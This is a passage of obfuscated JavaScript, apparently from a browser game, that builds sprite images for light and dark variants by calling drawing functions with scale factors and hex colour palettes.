			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃⲆⲆᐃᐃᐃ(ᐃ * .9, [ⵠ[453], "#4d1b59", "#5d3f77", "#220e26", ⵠ[407]]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI, ΔⲆΔⲆΔΔⲆ(.9 * ᐃ, [ⵠ[339], ⵠ[280], ⵠ[280], ⵠ[280], ⵠ[210], ⵠ[339]])));
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI, ΔⲆΔⲆΔΔⲆ(.9 * ᐃ, [ⵠ[453], "#401d49", ⵠ[280], "#401d49", ⵠ[210], ⵠ[339]])));
			ⵠⲆ[Ⲇ.ⵠΔΔⲆⲆΔⵠ] = ⵠᐃⵠ(ᐃΔⵠⵠⲆⲆⲆᐃⲆ(.6 * ᐃ, [ⵠ[210]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔᐃⵠⲆⲆᐃ(ᐃ * 1.1, [ⵠ[434], "#231f20", ⵠ[280], "#7d7679", ⵠ[407]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔᐃⵠⲆⲆᐃ(1.1 * ᐃ, [ⵠ[453], "#1e181c", ⵠ[42], "#3e3e4a", ⵠ[407]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠⵠᐃⵠᐃΔ(ᐃ * .6, true, [ⵠ[440], ⵠ[369], ⵠ[510], ⵠ[340]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠⵠᐃⵠᐃΔ(ᐃ * .6, ⲆⲆⲆΔⲆ, ["#478e8b", "#327e73", ⵠ[398], "#08403f"]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃᐃᐃΔᐃⵠ(ᐃ * .6, ⲆⲆΔⲆⲆ, [ⵠ[510], ⵠ[340], ⵠ[440], ⵠ[369]]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃᐃᐃΔᐃⵠ(ᐃ * .6, ⵠⵠⲆⲆΔ, [ⵠ[398], "#08403f", "#478e8b", "#327e73"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆⲆⵠⲆⵠⵠ(.63 * ᐃ, true, [ⵠ[566], "#dee7e7", "#b8cccb", ⵠ[407], "#e3e8e8"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆⲆⵠⲆⵠⵠ(.63 * ᐃ, true, [ⵠ[398], "#368981", "#1c635e", "#7bbab4", "#469e95"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃⲆΔᐃⵠΔ(ᐃ * .6, true, [ⵠ[566], "#c5232c", "#84191d", "#a72027", ⵠ[503], ⵠ[ⵠⲆᐃΔⲆᐃᐃ]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃⲆΔᐃⵠΔ(.6 * ᐃ, true, [ⵠ[398], "#392966", "#2a194f", "#433379", "#66aaa3", "#469e95"]));
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃᐃⲆⲆⲆΔ(.6 * ᐃ, ΔᐃΔΔⵠ, [ⵠ[566], "#0f964c", "#106e3b", "#138344", ⵠ[503], ⵠ[256], "#C5232C", "#A92D2D"]));
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃᐃⲆⲆⲆΔ(ᐃ * .6, ΔᐃⲆⵠⵠ, [ⵠ[398], ⵠ[325], ⵠ[118], ⵠ[548], "#66aaa3", "#469e95", "#292f66", "#202559"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠᐃΔᐃⵠⵠΔ(.42 * ᐃ, true, [ⵠ[111], "#515C57", "#3A4942", "#68736F", ⵠ[523], ⵠ[205], ⵠ[204], "#222825", "#4D5752", "#e48727", "#d4a872", "#343d39"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠᐃΔᐃⵠⵠΔ(.42 * ᐃ, true, [ⵠ[111], "#485E66", ⵠ[443], "#60757D", ⵠ[523], ⵠ[205], ⵠ[204], ⵠ[443], "#344B51", "#D8E57F", "#dfa64e", "#192225"]));
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃΔⵠᐃⲆ(.9 * ᐃ, ["#e4c027"]));
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃΔⵠᐃⲆ(ᐃ * .9, ["#D8E57F"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠᐃⵠΔᐃ(.42 * ᐃ, ᐃΔᐃⵠΔ, [ⵠ[111], "#515C57", "#3A4942", "#68736F", ⵠ[523], ⵠ[205], ⵠ[204], "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠᐃⵠΔᐃ(ᐃ * .42, ᐃⲆⲆᐃΔ, [ⵠ[111], "#485E66", ⵠ[443], "#60757D", ⵠ[523], ⵠ[205], ⵠ[204], ⵠ[443], "#344B51", "#D8E57F", "#dfa64e", "#1b2529"]));
			ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠΔⵠ] = ⵠᐃⵠ(ⵠⵠΔᐃⵠⲆΔᐃⲆ(ⵠᐃⵠΔ * ᐃ, [ⵠ[178], ⵠ[428], "#543B1C", "#694D28", "#7E8A85", "#384740", "#525956"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔΔΔⲆⲆᐃ(.5 * ᐃ, true, [ⵠ[111], ⵠ[24], ⵠ[237], "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔΔΔⲆⲆᐃ(.5 * ᐃ, true, [ⵠ[111], ⵠ[252], ⵠ[132], "#60757d", "#ffdc73", "#fffce2", "#fef259"]));
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔⲆᐃⲆᐃΔ(.5 * ᐃ, true, [ⵠ[111], ⵠ[24], ⵠ[237], "#c0c0c0", "#4f4f4f", "#6c6c6c", ⵠ[265]]));
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔⲆᐃⲆᐃΔ(.5 * ᐃ, true, [ⵠ[111], ⵠ[252], ⵠ[132], "#60757d", "#152229", "#0c1113", "#0c1113"]));
			ⵠⲆ[Ⲇ.ⲆΔΔΔᐃΔΔ] = ⵠᐃⵠ(ⵠΔⲆⵠⵠΔⵠⵠᐃ(ᐃ * .8, true, [ⵠ[237], ⵠ[24]]));
			ⵠⲆ[Ⲇ.ΔΔⵠΔⲆⲆΔ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ⵠⲆᐃΔᐃⵠⵠ,
				x: Δⵠᐃ,
				y: 0,
				a: 1,
				r: Math.PI / 2.5,
				c: [ⵠ[516], ⵠ[382]]
			}], .3, ["#494949", "#5b5858", "#3d3b3b"], 1);
			ⵠⲆ[Ⲇ.ⲆⲆⲆⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⲆⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃⵠΔᐃΔⲆ(ᐃⲆᐃ * ᐃ, ⵠΔΔⵠΔⵠᐃ, [ⵠ[111], ⵠ[197], ⵠ[347], "#261912", "#eee6c5", "#d1c599", ⵠ[197], ⵠ[347], "#86509b", "#703a99"]));
			ⵠⲆ[Ⲇ.ⲆⲆⲆⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃⵠΔᐃΔⲆ(ᐃ * ΔⵠⲆΔ, ⵠⲆⵠⵠΔ, [ⵠ[111], ⵠ[375], ⵠ[540], "#052120", "#104d5b", "#0b424f", ⵠ[375], ⵠ[540], "#2b0b4a", "#23073e"]));
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⵠⵠΔΔⵠⵠ(ᐃ * 1, true, [ⵠ[111], ⵠ[197], ⵠ[347], "#261912", "#eee6c5", "#d1c599", ⵠ[197], ⵠ[347], "#86509b", "#703a99"]));
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠⲆⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⵠⵠΔΔⵠⵠ(ΔⲆᐃᐃ * ᐃ, true, [ⵠ[111], ⵠ[375], ⵠ[540], "#052120", "#104d5b", "#083b37", ⵠ[375], ⵠ[540], "#2b0b4a", "#23073e"]));
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⲆⵠΔΔᐃΔ(ᐃ * .7, ᐃⲆᐃᐃⲆ, [ⵠ[111], ⵠ[285], ⵠ[108], ⵠ[248], ⵠ[71], ⵠ[71], ⵠ[106], ⵠ[532], ⵠ[85]])));
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⲆⵠΔΔᐃΔ(.7 * ᐃ, ΔᐃⲆⵠⵠ, [ⵠ[111], ⵠ[375], ⵠ[540], ⵠ[241], "#281b4e", "#2f2157", "#281b4e", "#104d5b", "#083b37"])));
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔᐃⲆΔ, ᐃⵠⵠⵠᐃⵠᐃ(.7 * ᐃ, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[285], ⵠ[108], "#765d42", ⵠ[532], ⵠ[85]])));
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠⵠ, ᐃⵠⵠⵠᐃⵠᐃ(.7 * ᐃ, true, [ⵠ[111], ⵠ[375], ⵠ[540], "#0e4d49", "#1a6c67", "#07322f"])));
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Δⵠᐃⵠ, ⵠᐃᐃⲆⲆⲆⲆ(.65 * ᐃ, true, [ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[532], ⵠ[85], "#7a7575", "#454749", "#8c8787", ⵠ[24], ⵠ[237], "#aaa6a6"])));
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠᐃ, ⵠᐃᐃⲆⲆⲆⲆ(ᐃ * .65, true, [ⵠ[111], ⵠ[533], ⵠ[ⲆⵠΔΔ], "#1a6c67", "#07322f", "#374950", "#101f26", "#2c3c42", ⵠ[252], ⵠ[132], "#546e78"])));
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠᐃ, ᐃΔᐃΔⵠⵠΔ(.67 * ᐃ, ᐃⲆⲆᐃΔ, [ⵠ[111], ⵠ[400], ⵠ[330], "#a69e39", "#9c8828", "#bab143", ⵠ[104], ⵠ[193], "#d2ca59"])));
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠⵠ, ᐃΔᐃΔⵠⵠΔ(ᐃ * .67, ᐃΔᐃⵠΔ, [ⵠ[453], ⵠ[181], ⵠ[103], "#33916d", "#197c62", "#3eab81", ⵠ[561], ⵠ[174], "#52be94"])));
			ⵠⲆ[Ⲇ.ΔᐃΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠᐃ, ⵠᐃᐃᐃΔᐃᐃ(ᐃ * .67, true, [ⵠ[111], ⵠ[435], ⵠ[76], "#4ba8b4", "#198a82", "#6ccad7", ⵠ[226], ⵠ[448], "#7bd9e6"])));
			ⵠⲆ[Ⲇ.ΔᐃΔΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⲆⲆ, ⵠᐃᐃᐃΔᐃᐃ(.67 * ᐃ, true, [ⵠ[111], ⵠ[522], ⵠ[357], "#4bbbc3", "#23a19d", "#54c5cd", "#4ad2ce", ⵠ[102], ⵠ[74]])));
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⲆᐃⵠⲆⲆᐃ(.67 * ᐃ, ΔᐃⲆⵠⵠ, [ⵠ[111], ⵠ[435], ⵠ[76], "#9443b1", "#6f1988", "#a752c6", "#9e35be", ⵠ[116], ⵠ[525]])));
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⲆᐃⵠⲆⲆᐃ(.67 * ᐃ, ⲆⵠⵠᐃⲆ, [ⵠ[111], ⵠ[522], ⵠ[357], "#6e43bf", "#673fa4", "#784bcc", "#845bc6", ⵠ[459], "#966be7"])));
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆⲆΔⲆ, ΔΔⲆⵠⲆΔΔ(ⵠᐃⵠΔ * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[111], "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"])));
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⲆΔⵠ, ΔΔⲆⵠⲆΔΔ(ᐃ * ᐃᐃⵠ, ⲆⲆⲆΔⲆ, [ⵠ[111], "#1c2026", ⵠ[357], "#7dc6d9", "#6cbacf", ⵠ[385], "#49b2cf", ⵠ[385]])));
			ⵠⲆ[Ⲇ.ΔⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆᐃΔᐃ, ΔⵠᐃΔᐃ(1 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[24], ⵠ[237]])));
			ⵠⲆ[Ⲇ.ΔⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠΔΔΔΔ, ΔⵠᐃΔᐃ(1 * ᐃ, true, [ⵠ[453], ⵠ[181], ⵠ[103], ⵠ[252], ⵠ[132]])));
			ⵠⲆ[Ⲇ.ΔΔᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⵠⲆⵠⲆⲆⵠⲆ(.5 * ᐃ, ⵠⲆⲆⵠᐃ, [ⵠ[111], ⵠ[24], ⵠ[237]])));
			ⵠⲆ[Ⲇ.ΔΔᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔⲆΔᐃ, ⵠⲆⵠⲆⲆⵠⲆ(ᐃ * .5, ⵠⲆΔᐃⲆ, [ⵠ[453], ⵠ[252], ⵠ[132]])));
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⲆΔⵠ, ΔⵠΔⲆⵠⲆⲆ(ⵠᐃⵠΔ * ᐃ, ᐃⵠΔᐃΔ, [ⵠ[111], "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb"])));
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⵠΔⲆⵠⲆⲆ(ᐃ * 1, true, [ⵠ[111], "#2a4f4a", "#1e423d", "#1e0302", "#096b3f", "#3db76f", "#118254", "#40c696", "#0c7a50", "#59d8a4", "#249376", "#80d8c7"])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⵠᐃΔᐃ(ᐃ * 1, true, [ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193]])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⵠᐃΔᐃ(ⵠΔΔ * ᐃ, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[533], ⵠ[ᐃⲆⵠᐃ], ⵠ[561], ⵠ[174]])));
			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ΔⵠᐃΔᐃ(1 * ᐃ, true, [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448]])));
			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠᐃⵠⲆ, ΔⵠᐃΔᐃ(ᐃ * ⵠΔⵠΔ, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[522], ⵠ[357], ⵠ[74], ⵠ[102]])));
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠⵠ, ΔⵠᐃΔᐃ(ᐃ * 1, ⲆᐃΔⲆⲆ, [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116]])));
			ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔⲆΔᐃ, ΔⵠᐃΔᐃ(ᐃ * 1, true, [ⵠ[111], ⵠ[522], ⵠ[357], ⵠ[436], ⵠ[459]])));
			ⵠⲆ[Ⲇ.ΔΔΔⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆⲆⵠΔΔⵠ(.55 * ᐃ, ᐃⵠⵠⲆᐃ, [ⵠ[247], ⵠ[25], ⵠ[40], "#3a3a3a"]));
			ⵠⲆ[Ⲇ.ΔΔΔⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆⲆⵠΔΔⵠ(ᐃ * .55, false, ["#080707", "#133d3c", ⵠ[402], "#1b2529"]));
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ].push(ⵠᐃⵠ(ᐃⲆⲆⵠΔΔⵠ(.8 * ᐃ, false, [ⵠ[247], ⵠ[25], ⵠ[40], "#3a3a3a"])));
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ].push(ⵠᐃⵠ(ᐃⲆⲆⵠΔΔⵠ(.8 * ᐃ, ⲆΔⵠⲆΔ, [ⵠ[247], "#9f7d17", "#dab33c", "#474545"])));
			ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ].push(ⵠᐃⵠ(ᐃⲆⲆⵠΔΔⵠ(.8 * ᐃ, false, [ⵠ[247], "#73590d", "#a88a2c", "#2a2828"])));
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃⵠΔ].push(ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ][ΔΔⵠ]);
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃⵠΔ].push(ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ][Ⲇᐃⵠⵠ]);
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃⵠΔ].push(ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ][0]);
			ⵠⲆ[Ⲇ.ΔⵠΔⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃⲆΔᐃᐃ(.06 * ᐃ, ⲆΔᐃⲆΔ, [ⵠ[247], ⵠ[40], ⵠ[25]]));
			ⵠⲆ[Ⲇ.ΔⵠΔⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃⲆΔᐃᐃ(ᐃ * .06, ΔᐃⵠᐃⲆ, [ⵠ[453], ⵠ[402], "#133d3c"]));
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃⲆⵠ].push(ⵠᐃⵠ(ⵠⲆᐃⲆΔᐃᐃ(.08 * ᐃ, ᐃⵠⵠⲆᐃ, [ⵠ[247], ⵠ[40], ⵠ[25]])));
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃⲆⵠ].push(ⵠᐃⵠ(ⵠⲆᐃⲆΔᐃᐃ(.08 * ᐃ, ⲆΔᐃⲆΔ, [ⵠ[247], "#e2bd4e", "#a38018"])));
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃⲆⵠ].push(ⵠᐃⵠ(ⵠⲆᐃⲆΔᐃᐃ(.08 * ᐃ, ᐃⵠΔⵠⲆ, [ⵠ[247], "#b0902e", "#634d09"])));
			ⵠⲆ[Ⲇ.ⵠΔⲆⲆᐃ] = ᐃⲆⲆᐃ(1.5, [{
				f: ΔⵠⲆᐃΔΔᐃ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[247], "#178a99", "#0a6372", "#03282e"]
			}], .45, ["#5bbcc9", "#73d2df", "#4daab6"], .9);
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠⲆⲆⵠᐃⲆ(.8 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[442], ⵠ[320]]));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠⲆⲆⵠᐃⲆ(ᐃ * .8, ᐃⵠΔᐃΔ, ["#98ede3", "#94f2e7"]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃΔᐃⲆⲆⵠ(ᐃ * .8, ⲆⲆⲆΔⲆ, [ⵠ[175], ⵠ[562], "#418ba5", "#59b8ce"]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃΔᐃⲆⲆⵠ(ᐃ * .8, true, [ⵠ[365], ⵠ[ⵠⲆⲆⲆᐃ], "#3fa097", "#90ddd9"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆᐃᐃⲆΔ(ᐃ * .8, true, [ⵠ[175], ⵠ[562]]));
			ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆᐃᐃⲆΔ(ᐃ * .8, ⲆᐃΔⲆⲆ, [ⵠ[12], ⵠ[252]]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃΔᐃⵠⵠᐃ(.8 * ᐃ, true, [ⵠ[442], ⵠ[320], "#1c2528", ⵠ[175], ⵠ[562], "#959da0", "#697072", "#929da0", "#afb9bc"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃΔᐃⵠⵠᐃ(.8 * ᐃ, ⵠⲆΔᐃⲆ, ["#98ede3", "#94f2e7", ⵠ[132], ⵠ[365], ⵠ[12], ⵠ[252], "#2d484f", "#546d6d", "#597b84"]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆⲆⲆⵠⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠⲆⵠⲆⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⵠⲆᐃ] = [];
